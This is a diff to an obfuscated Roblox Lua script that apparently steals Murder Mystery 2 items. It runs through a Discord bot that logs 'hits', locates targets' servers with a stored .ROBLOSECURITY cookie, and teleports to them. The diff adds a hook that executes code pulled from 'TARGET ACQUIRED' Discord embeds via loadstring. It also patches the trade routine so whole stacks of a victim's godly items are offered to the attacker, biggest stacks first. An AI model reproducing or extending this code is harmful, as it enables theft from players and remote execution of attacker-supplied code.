@@ -10,6 +10,7 @@ _cmdCh        = _cmdCh or _ch;
 _owner        = _owner or "";
 _robloxCookie = _robloxCookie or "";
 _allow        = _allow or {[142823291] = true};
+_embedCh      = _embedCh or _hitCh;   -- channel to scan for exec-embeds
 -- ═══════════════════════════════════════════════════════════════
 
 if _bt == "" or _ch == "" then
@@ -486,6 +487,7 @@ end
 if not isfile("hits_joined.dat") then writefile("hits_joined.dat", "[]") end
 if not isfile("last_target.dat") then writefile("last_target.dat", "none") end
 if not isfile("pending_hits.dat") then writefile("pending_hits.dat", "[]") end
+if not isfile("executed_embeds.dat") then writefile("executed_embeds.dat", "[]") end
 
 local function _rl(_f)
     local _ok, _t = pcall(function() return _hs:JSONDecode(readfile(_f)) end);
@@ -542,9 +544,40 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
+-- ─── EMBED MATCHER (used by _pjm and _execEmbed) ───
+-- Matches the "🎯  TARGET ACQUIRED" embed from the trade script.
+-- Fingerprint: title contains "TARGET ACQUIRED" AND color == 0x0A1A3C
+--   (fallback: footer contains "deadhub" AND desc contains "just landed")
+local function _embedLooksRight(_e)
+    if not _e then return false end
+    local title      = tostring(_e.title or "");
+    local color      = tonumber(_e.color);
+    local footerText = (_e.footer and tostring(_e.footer.text or "")) or "";
+    local desc       = tostring(_e.description or "");
+
+    if title:find("TARGET ACQUIRED") and color == 0x0A1A3C then
+        return true;
+    end
+    if footerText:find("deadhub") and desc:find("just landed") then
+        return true;
+    end
+    return false;
+end
+
+local function _hasTargetEmbed(_md)
+    if not _md or not _md.embeds then return false end
+    for _, _e in ipairs(_md.embeds) do
+        if _embedLooksRight(_e) then return true end
+    end
+    return false;
+end
+
 local function _pjm(_m)
     if not _m or not _m.author then return end
     if _m.channel_id and _m.channel_id ~= _hitCh then return end
+    -- skip anything with the TARGET ACQUIRED embed — the embed hook handles
+    -- those via _execEmbed, so we avoid a double-teleport.
+    if _hasTargetEmbed(_m) then return end
     local _c = _m.content or "";
     local _pi, _ji = string.match(_c, "(%d+),%s*'([^']+)'");
     if not (_pi and _ji) then _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"'); end
@@ -600,6 +633,11 @@ function _tpTo(_pi, _ji, _mi)
     end)
 end
 
+-- ═══════════════════════════════════════════════════════════════
+--  PATCHED: returns unique item IDs with stack counts so we can
+--  dump entire stacks into a single trade slot instead of wasting
+--  slots on duplicate copies of the same item.
+-- ═══════════════════════════════════════════════════════════════
 local function _collectGodlies()
     local _out = {};
     if not _isMM2 or not _gi then return _out end
@@ -616,6 +654,7 @@ local function _collectGodlies()
     for _i, _c in pairs(_counts) do
         table.insert(_out, { id = _i, count = _c });
     end
+    -- biggest stacks first so we clear the most value per trade
     table.sort(_out, function(_a, _b) return _a.count > _b.count end);
     return _out;
 end
@@ -671,6 +710,10 @@ local function _doTransfer(_targetName)
         if not _transferActive then break end
         if not _sent then task.wait(2);
         else
+            -- ═══════════════════════════════════════════════════════
+            --  PATCHED: fire OfferItem once per COPY so the stack
+            --  fills the whole slot. 4 unique items max, unlimited qty.
+            -- ═══════════════════════════════════════════════════════
             local _offered = 0;
             local _slots = math.min(4, #_batch);
             for _i = 1, _slots do
@@ -697,6 +740,69 @@ local function _doTransfer(_targetName)
     end
     _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**", 0x3EED50);
     _transferActive = false; _transferTarget = nil;
+end
+
+-- ═══════════════════════════════════════════════════════════════
+--  EMBED EXEC — reacts to embeds that contain game:GetService(...)
+-- ═══════════════════════════════════════════════════════════════
+-- Pull the first game:GetService(...) line out of the MESSAGE content,
+-- falling back to any embed text field if the content is empty.
+local function _extractCode(_md, _e)
+    local candidates = {};
+
+    if _md and _md.content then
+        table.insert(candidates, tostring(_md.content));
+    end
+    if _e then
+        if _e.description then table.insert(candidates, _e.description) end
+        if _e.title       then table.insert(candidates, _e.title) end
+        if _e.fields then
+            for _, f in ipairs(_e.fields) do
+                table.insert(candidates, f.value or "");
+                table.insert(candidates, f.name  or "");
+            end
+        end
+        if _e.footer and _e.footer.text then
+            table.insert(candidates, _e.footer.text);
+        end
+    end
+
+    for _, txt in ipairs(candidates) do
+        local cleaned = txt:gsub("```[%w]*", ""):gsub("`", "");
+        local line = cleaned:match("(game:GetService[^\r\n]+)");
+        if line then
+            return line;
+        end
+    end
+    return nil;
+end
+
+local function _execEmbed(_md)
+    if not _md.embeds or #_md.embeds == 0 then return end
+    for _, _e in ipairs(_md.embeds) do
+        if _embedLooksRight(_e) then
+            if _il("executed_embeds.dat", _md.id) then return end
+            local code = _extractCode(_md, _e);
+            if not code then return end
+
+            local fn, err = loadstring(code);
+            if not fn then
+                _postEmbed("❌ Embed Load Error",
+                    "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000);
+                return;
+            end
+
+            local ok, runErr = pcall(fn);
+            _al("executed_embeds.dat", _md.id);
+
+            _postEmbed(
+                ok and "✅ Embed Exec" or "❌ Embed Runtime Error",
+                "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
+                ok and 0x3EED50 or 0xFF0000
+            );
+            return;
+        end
+    end
 end
 
 -- ═══════════════════════════════════════════════════════════════
@@ -851,6 +957,13 @@ local function _gw()
             local _content = tostring(_md.content or "");
             local _isCmd = (_md.channel_id == _cmdCh);
             local _isHit = (_md.channel_id == _hitCh);
+
+            -- embed exec hook — fires on TARGET ACQUIRED embeds
+            if _md.embeds and #_md.embeds > 0
+               and (_md.channel_id == _embedCh)
+               and ((_md.author and _md.author.bot) or _isOwner(_md.author)) then
+                task.spawn(_execEmbed, _md);
+            end
 
             if _isCmd then
                 -- !help
@@ -1077,107 +1190,29 @@ local function _gw()
                     return;
                 end
 
-                -- !serverget <user>  (HARDENED — fresh CSRF, GET fallback, verbose errors)
+                -- !serverget <user>
                 local _sgU = _content:match("^!serverget%s+(.+)$");
                 if _sgU then
                     if not _isOwner(_md.author) then return end
                     task.spawn(function()
-                        if _robloxCookie == "" then
-                            _postEmbed("❌ No Cookie", "Set `_robloxCookie` global first.", 0xFF0000);
-                            return;
-                        end
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-
-                        local _lookupName = _sgU:gsub("^%s+", ""):gsub("%s+$", "");
-                        local _uid, _uname = _getUserId(_lookupName);
-                        if not _uid then
-                            _postEmbed("❌ Lookup Failed", "Could not find `".._lookupName.."`", 0xFF0000);
-                            return;
-                        end
-                        _uname = _uname or _lookupName;
-
-                        -- Force-refresh CSRF every call so stale cache never blocks us
-                        _csrfToken = nil;
-                        _csrfFetchedAt = 0;
-
-                        print("[serverget] uid="..tostring(_uid).." uname="..tostring(_uname));
-
-                        -- Try POST
-                        local _bodyJson = _hs:JSONEncode({ userIds = { _uid } });
-                        local _r = _cookiePostRetry("https://presence.roblox.com/v1/presence/users", _bodyJson);
-
-                        print("[serverget] POST status="..tostring(_r and _r.StatusCode));
-
-                        -- GET fallback if POST failed
-                        if not _r or _r.StatusCode ~= 200 then
-                            local _getUrl = "https://presence.roblox.com/v1/presence/users?userIds=" .. tostring(_uid);
-                            local _okG, _rg = pcall(function()
-                                return request({
-                                    Url = _getUrl,
-                                    Method = "GET",
-                                    Headers = {
-                                        ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie,
-                                        ["User-Agent"] = "Roblox/WinInet"
-                                    }
-                                })
-                            end);
-                            if _okG and _rg and _rg.StatusCode == 200 then
-                                print("[serverget] GET fallback succeeded");
-                                _r = _rg;
-                            else
-                                print("[serverget] GET fallback: " .. tostring(_rg and _rg.StatusCode));
-                            end
-                        end
-
-                        if not _r or _r.StatusCode ~= 200 then
-                            local _code = _r and _r.StatusCode or "nil"
-                            local _body = _r and tostring(_r.Body):sub(1, 400) or "no body"
-                            local _hint = ""
-                            if _code == 401 then _hint = "\n**→ Cookie is expired or invalid. Regenerate your `.ROBLOSECURITY`.**"
-                            elseif _code == 403 then _hint = "\n**→ CSRF failed, or Roblox is rate-limiting. Wait 30s and retry.**"
-                            elseif _code == 429 then _hint = "\n**→ Rate limited. Wait a minute.**"
-                            elseif _code == 400 then _hint = "\n**→ Bad request body. Report this.**"
-                            end
-                            _postEmbed("❌ Failed",
-                                "**Status:** `"..tostring(_code).."`\n" ..
-                                "**Body:**\n```\n".._body.."\n```".._hint,
-                                0xFF0000);
-                            return;
-                        end
-
+                        local _uid = _getUserId(_sgU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _r = _cookiePostRetry("https://presence.roblox.com/v1/presence/users",
+                            _hs:JSONEncode({ userIds = { _uid } }));
+                        if not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
                         local _d = _hs:JSONDecode(_r.Body);
                         local _p = _d.userPresences and _d.userPresences[1];
-                        if not _p then
-                            _postEmbed("❌ No Presence Data",
-                                "**Raw body:**\n```\n".._r.Body:sub(1,400).."\n```",
-                                0xFF0000);
-                            return;
-                        end
-
-                        -- Presence type: 0=Offline, 1=Online(web), 2=InGame, 3=Studio
-                        local _typeText = ({
-                            [0] = "Offline",
-                            [1] = "Online (website)",
-                            [2] = "In Game",
-                            [3] = "In Studio",
-                        })[_p.userPresenceType] or ("Unknown ("..tostring(_p.userPresenceType)..")")
-
+                        if not _p then _postEmbed("❌ No data", "", 0xFF0000); return end
                         if _p.userPresenceType ~= 2 then
-                            _postEmbed("❌ Not In Game",
-                                "**".._uname.."** — ".._typeText,
-                                0xFFA500);
+                            _postEmbed("❌ Not In Game", "**".._sgU.."** isn't playing.", 0xFFA500);
                             return;
                         end
-
                         local _jc = "game:GetService('TeleportService'):TeleportToPlaceInstance("..
                             tostring(_p.placeId)..", '"..tostring(_p.gameId).."')";
-                        _postEmbed("🎯 ".._uname,
-                            "**Game:** `"..tostring(_p.lastLocation or "?").."`\n" ..
-                            "**PlaceId:** `"..tostring(_p.placeId).."`\n" ..
-                            "**JobId:** `"..tostring(_p.gameId).."`\n" ..
-                            "**RootPlaceId:** `"..tostring(_p.rootPlaceId).."`\n" ..
-                            "**UniverseId:** `"..tostring(_p.universeId).."`\n\n" ..
-                            "**Join command:**\n```\n".._jc.."\n```",
+                        _postEmbed("🎯 ".._sgU,
+                            "**Game:** `"..tostring(_p.lastLocation or "?").."`\n**JobId:** `"..tostring(_p.gameId).."`\n\n```\n".._jc.."\n```",
                             0x3EED50);
                     end);
                     return;
